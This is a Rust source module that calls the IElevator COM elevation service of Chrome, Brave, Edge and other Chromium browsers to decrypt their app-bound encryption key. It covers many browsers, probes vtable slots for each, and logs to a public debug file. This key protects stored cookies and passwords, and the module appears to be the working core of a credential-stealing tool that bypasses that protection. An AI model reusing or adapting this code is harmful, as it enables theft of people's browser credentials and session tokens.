//! IElevator COM interface — supports Chrome, Chrome Beta, Chrome Dev,
//! Chrome Canary, Brave, Edge, and other Chromium forks (Opera, Vivaldi, etc.).
//!
//! All Windows COM/Ole calls use raw `extern "system"` to avoid name clashes
//! with the generic windows-crate wrappers.

#![allow(non_snake_case, non_camel_case_types)]

use std::ffi::c_void;

// ── GUID ──────────────────────────────────────────────────────────────────────

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
    GUID { data1: d1, data2: d2, data3: d3, data4: d4 }
}

// Shared base interfaces (Chromium/Chrome family).
const IID_ELEVATOR2: GUID = guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05]);
const IID_ELEVATOR2_CHROMIUM: GUID = guid(0xBB19A0E5, 0x00C6, 0x4966, [0x94, 0xB2, 0x5A, 0xFE, 0xC6, 0xFE, 0xD9, 0x3A]);
const IID_ELEVATOR: GUID = guid(0xA949CB4E, 0xC4F9, 0x44C4, [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C]);
const IID_ELEVATOR_CHROMIUM: GUID = guid(0xB88C45B9, 0x8825, 0x4629, [0xB3, 0x8E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED]);

const IID_ELEVATOR2_CHROME: GUID = guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38]);
const IID_ELEVATOR_CHROME: GUID = guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]);

const IID_ELEVATOR2_CHROME_BETA: GUID = guid(0xB96A14B8, 0xD0B0, 0x44D8, [0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54]);
const IID_ELEVATOR_CHROME_BETA: GUID = guid(0xA2721D66, 0x376E, 0x4D2F, [0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F]);

const IID_ELEVATOR2_CHROME_DEV: GUID = guid(0x3FEFA48E, 0xC8BF, 0x461F, [0xAE, 0xD6, 0x63, 0xF6, 0x58, 0xCC, 0x85, 0x0A]);
const IID_ELEVATOR_CHROME_DEV: GUID = guid(0xBB2AA26B, 0x343A, 0x4072, [0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71]);

const IID_ELEVATOR2_CHROME_CANARY: GUID = guid(0xFF672E9F, 0x0994, 0x4322, [0x81, 0xE5, 0x3A, 0x5A, 0x97, 0x46, 0x14, 0x0A]);
const IID_ELEVATOR_CHROME_CANARY: GUID = guid(0x4F7CE041, 0x28E9, 0x484F, [0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4]);

const IID_ELEVATOR_BRAVE: GUID = guid(0xF396861E, 0x0C8E, 0x4C71, [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0x9E]);
const IID_ELEVATOR_BRAVE_BASE: GUID = guid(0x5A9A9462, 0x2FA1, 0x4FEB, [0xB7, 0xF2, 0xDF, 0x3D, 0x19, 0x13, 0x44, 0x63]);

const IID_ELEVATOR_EDGE: GUID = guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]);

static CHROME_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static CHROME_BETA_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME_BETA,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME_BETA,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static CHROME_DEV_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME_DEV,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME_DEV,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static CHROME_CANARY_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME_CANARY,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME_CANARY,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static BRAVE_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_BRAVE,
    IID_ELEVATOR_BRAVE_BASE,
    IID_ELEVATOR_CHROMIUM,
];

static EDGE_IIDS: &[GUID] = &[
    IID_ELEVATOR2,
    IID_ELEVATOR_EDGE,
    IID_ELEVATOR,
];

// ── Browser configs ───────────────────────────────────────────────────────────

/// One browser's COM class + interface pair.
pub struct BrowserCom {
    pub name: &'static str,
    /// Registry CLSID for the elevation service
    pub clsid: GUID,
    /// Interface IIDs to try in order (newest first)
    pub iids: &'static [GUID],
    /// Expected subfolder under %LOCALAPPDATA% for User Data
    pub user_data_rel: &'static str,
    /// Windows elevation service name (for error hints)
    pub service_name: &'static str,
}

static GENERIC_CHROMIUM_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
    IID_ELEVATOR2_CHROME,
    IID_ELEVATOR_CHROME,
];

static GENERIC_CHROMIUM: BrowserCom = BrowserCom {
    name: "Chromium",
    clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
    iids: GENERIC_CHROMIUM_IIDS,
    user_data_rel: r"Chromium\User Data",
    service_name: "ChromiumElevationService",
};

static BROWSERS: &[BrowserCom] = &[
    BrowserCom {
        name: "Chrome",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: CHROME_IIDS,
        user_data_rel: r"Google\Chrome\User Data",
        service_name: "GoogleChromeElevationService",
    },
    BrowserCom {
        name: "Chrome Beta",
        clsid: guid(0xDD2646BA, 0x3707, 0x4BF8, [0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2]),
        iids: CHROME_BETA_IIDS,
        user_data_rel: r"Google\Chrome Beta\User Data",
        service_name: "GoogleChromeBetaElevationService",
    },
    BrowserCom {
        name: "Chrome Dev",
        clsid: guid(0xDA7FDCA5, 0x2CAA, 0x4637, [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA]),
        iids: CHROME_DEV_IIDS,
        user_data_rel: r"Google\Chrome Dev\User Data",
        service_name: "GoogleChromeDevElevationService",
    },
    BrowserCom {
        name: "Chrome Canary",
        clsid: guid(0x704C2872, 0x2049, 0x435E, [0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B]),
        iids: CHROME_CANARY_IIDS,
        user_data_rel: r"Google\Chrome SxS\User Data",
        service_name: "GoogleChromeCanaryElevationService",
    },
    BrowserCom {
        name: "Brave",
        clsid: guid(0x576B31AF, 0x6369, 0x4B6B, [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B]),
        iids: BRAVE_IIDS,
        user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
        service_name: "BraveElevationService",
    },
    BrowserCom {
        name: "Edge",
        clsid: guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]),
        iids: EDGE_IIDS,
        user_data_rel: r"Microsoft\Edge\User Data",
        service_name: "MicrosoftEdgeElevationService",
    },
    BrowserCom {
        name: "Vivaldi",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: GENERIC_CHROMIUM_IIDS,
        user_data_rel: r"Vivaldi\User Data",
        service_name: "VivaldiElevationService",
    },
    BrowserCom {
        name: "Opera",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: GENERIC_CHROMIUM_IIDS,
        user_data_rel: r"Opera Software\Opera Stable",
        service_name: "OperaElevationService",
    },
    BrowserCom {
        name: "Yandex",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: GENERIC_CHROMIUM_IIDS,
        user_data_rel: r"Yandex\YandexBrowser\User Data",
        service_name: "YandexBrowserElevationService",
    },
];

pub fn all_browsers() -> &'static [BrowserCom] {
    BROWSERS
}

/// Detect browser + channel from the running process executable path.
pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
    let exe = exe_path.to_lowercase();

    if exe.contains("brave") {
        if exe.contains("beta") {
            return BROWSERS.iter().find(|b| b.name == "Brave");
        }
        if exe.contains("nightly") {
            return BROWSERS.iter().find(|b| b.name == "Brave");
        }
        return BROWSERS.iter().find(|b| b.name == "Brave");
    }
    if exe.contains("msedge") || (exe.contains("edge") && !exe.contains("chrome")) {
        if exe.contains("beta") {
            return BROWSERS.iter().find(|b| b.name == "Edge");
        }
        if exe.contains("dev") {
            return BROWSERS.iter().find(|b| b.name == "Edge");
        }
        return BROWSERS.iter().find(|b| b.name == "Edge");
    }
    if exe.contains("vivaldi") {
        return BROWSERS.iter().find(|b| b.name == "Vivaldi");
    }
    if exe.contains("opera") {
        return BROWSERS.iter().find(|b| b.name == "Opera");
    }
    if exe.contains("yandex") {
        return BROWSERS.iter().find(|b| b.name == "Yandex");
    }
    if exe.contains("coccoc") {
        return Some(&GENERIC_CHROMIUM);
    }
    if exe.contains("360chrome") || exe.contains("epic") || exe.contains("uran")
        || exe.contains("7star") || exe.contains("torch") || exe.contains("kometa")
        || exe.contains("orbitum") || exe.contains("amigo") || exe.contains("sputnik")
        || exe.contains("slimjet") || exe.contains("iridium") || exe.contains("thorium")
        || exe.contains("centbrowser") || exe.contains("\\arc\\")
    {
        return Some(&GENERIC_CHROMIUM);
    }
    if exe.contains("chrome") {
        if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
            return BROWSERS.iter().find(|b| b.name == "Chrome Canary");
        }
        if exe.contains("chrome dev") {
            return BROWSERS.iter().find(|b| b.name == "Chrome Dev");
        }
        if exe.contains("chrome beta") {
            return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
        }
        if exe.contains("chromium") && !exe.contains("google") {
            return Some(&GENERIC_CHROMIUM);
        }
        return BROWSERS.iter().find(|b| b.name == "Chrome");
    }

    None
}

const PUBLIC_DEBUG: &str = r"C:\Users\Public\cr_debug.log";

fn debug_log(msg: &str) {
    use std::io::Write;
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(PUBLIC_DEBUG)
    {
        let _ = writeln!(f, "{msg}");
    }
}

fn guid_to_string(g: &GUID) -> String {
    format!(
        "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
        g.data1,
        g.data2,
        g.data3,
        g.data4[0],
        g.data4[1],
        g.data4[2],
        g.data4[3],
        g.data4[4],
        g.data4[5],
        g.data4[6],
        g.data4[7],
    )
}

// ── Raw Windows API ───────────────────────────────────────────────────────────

#[link(name = "ole32")]
#[link(name = "oleaut32")]
extern "system" {
    fn CoInitializeEx(pv: *const c_void, co_init: u32) -> i32;
    fn CoUninitialize();
    fn CoCreateInstance(
        rclsid: *const GUID,
        punk_outer: *const c_void,
        ctx: u32,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> i32;
    fn CoSetProxyBlanket(
        proxy: *mut c_void,
        authn: u32,
        authz: u32,
        princ: *const u16,
        authn_lvl: u32,
        imp_lvl: u32,
        auth_info: *const c_void,
        caps: u32,
    ) -> i32;
    fn SysAllocStringByteLen(psz: *const i8, len: u32) -> *mut u16;
    fn SysFreeString(bstr: *mut u16);
    fn SysStringByteLen(bstr: *const u16) -> u32;
}

// ── IElevator COM vtable ──────────────────────────────────────────────────────
// vtable[0]: QueryInterface
// vtable[1]: AddRef
// vtable[2]: Release
// vtable[3]: RunRecoveryCRXElevated  (skipped)
// vtable[4]: EncryptData             (skipped)
// vtable[5]: DecryptData             ← called

type FnQI = unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32;
type FnRef = unsafe extern "system" fn(*mut c_void) -> u32;
type FnRun =
    unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16, u32, *mut usize) -> i32;
type FnEnc = unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut *mut u16, *mut u32) -> i32;
type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;

#[repr(C)]
struct Vtbl {
    qi: FnQI,
    ar: FnRef,
    rel: FnRef,
    run: FnRun,
    enc: FnEnc,
    dec: FnDec,
}
#[repr(C)]
struct IElev {
    vtbl: *const Vtbl,
}

// ── BSTR helpers ──────────────────────────────────────────────────────────────

struct OwnedBstr(*mut u16);

impl OwnedBstr {
    unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.is_empty() {
            return None;
        }
        let p = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() {
            None
        } else {
            Some(OwnedBstr(p))
        }
    }
    fn ptr(&self) -> *mut u16 {
        self.0
    }
}
impl Drop for OwnedBstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { SysFreeString(self.0) };
            self.0 = std::ptr::null_mut();
        }
    }
}

unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
    if p.is_null() {
        return Vec::new();
    }
    let len = SysStringByteLen(p) as usize;
    let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
    SysFreeString(p);
    bytes
}

// ── Core decryption ───────────────────────────────────────────────────────────

const COINIT_APARTMENTTHREADED: u32 = 0x2;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
/// Try all browsers and IIDs until one succeeds.
pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != 0x0000_0001u32 as i32 /* S_FALSE */ {
            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
        }

        let result = try_all_browsers(encrypted_key);
        CoUninitialize();
        result
    }
}

/// Try each browser COM config for the detected browser.
pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != 0x0000_0001u32 as i32 {
            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
        }
        let r = try_browser(browser, encrypted_key);
        CoUninitialize();
        r
    }
}

unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no browser tried");
    for b in BROWSERS {
        match try_browser(b, encrypted_key) {
            Ok(key) => return Ok(key),
            Err(e) => last = format!("{}: {e}", b.name),
        }
    }
    match try_browser(&GENERIC_CHROMIUM, encrypted_key) {
        Ok(key) => return Ok(key),
        Err(e) => last = format!("Chromium: {e}"),
    }
    Err(format!("all browsers failed; last: {last}"))
}

unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no IID tried");
    let mut saw_no_interface = false;
    let mut saw_class_not_reg = false;

    for iid in browser.iids {
        let iid_str = guid_to_string(iid);
        debug_log(&format!("try CoCreateInstance {} IID {iid_str}", browser.name));

        match try_one(encrypted_key, &browser.clsid, iid) {
            Ok(key) => {
                debug_log(&format!("DecryptData OK via IID {iid_str}"));
                return Ok(key);
            }
            Err(e) => {
                debug_log(&format!("  failed: {e}"));
                if e.contains("0x80004002") {
                    saw_no_interface = true;
                }
                if e.contains("0x80040154") || e.contains("0x80040111") {
                    saw_class_not_reg = true;
                }
                last = e;
            }
        }
    }

    let hint = if saw_class_not_reg {
        format!(
            "Elevation service not registered ({}). Reinstall {} or repair the elevation service.",
            browser.service_name, browser.name
        )
    } else if saw_no_interface {
        format!(
            "No IElevator interface matched ({}). Ensure {} is up to date.",
            browser.service_name, browser.name
        )
    } else {
        String::new()
    };

    if hint.is_empty() {
        Err(format!("{} failed; last: {last}", browser.name))
    } else {
        Err(format!("{} failed; last: {last}. {hint}", browser.name))
    }
}

unsafe fn call_decrypt_at_slot(
    punk: *mut c_void,
    enc: &[u8],
    slot: usize,
) -> Result<Vec<u8>, String> {
    let vtbl = *(punk as *const *const *const c_void);
    let dec_fn_ptr = *vtbl.add(slot);
    if dec_fn_ptr.is_null() {
        return Err(format!("null DecryptData at slot {slot}"));
    }
    let dec: FnDec = std::mem::transmute(dec_fn_ptr);

    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
    let mut plain: *mut u16 = std::ptr::null_mut();
    let mut last_err: u32 = 0;

    let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
    if hr_d < 0 {
        return Err(format!("DecryptData slot {slot} 0x{hr_d:08X} last_error={last_err}"));
    }
    let bytes = consume_bstr(plain);
    if bytes.is_empty() {
        return Err(format!("empty key at slot {slot}"));
    }
    Ok(bytes)
}

fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
    if bytes.len() == 32 {
        return Some(bytes.to_vec());
    }
    if bytes.len() > 32 {
        let tail = &bytes[bytes.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    None
}

unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = CoCreateInstance(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
    if hr < 0 {
        return Err(format!("CoCreateInstance 0x{hr:08X}"));
    }
    if punk.is_null() {
        return Err("null COM pointer".into());
    }

    let hr_pb = CoSetProxyBlanket(
        punk,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        std::ptr::null(),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        std::ptr::null(),
        EOAC_DYNAMIC_CLOAKING,
    );
    if hr_pb < 0 {
        debug_log(&format!("CoSetProxyBlanket 0x{hr_pb:08X}"));
    }

    let elev = punk as *mut IElev;
    let release = || ((*(*elev).vtbl).rel)(punk);

    // Chrome/Brave: slot 5. Edge and some forks: slot 8 (extra IElevatorEdgeBase methods).
    let mut last = String::from("no slot worked");
    for slot in [5usize, 8, 6, 7] {
        match call_decrypt_at_slot(punk, enc, slot) {
            Ok(bytes) => {
                if let Some(key) = normalize_com_key(&bytes) {
                    release();
                    return Ok(key);
                }
                last = format!("slot {slot}: unexpected length {}", bytes.len());
            }
            Err(e) => last = e,
        }
    }

    release();
    Err(format!("DecryptData failed; last: {last}"))
}
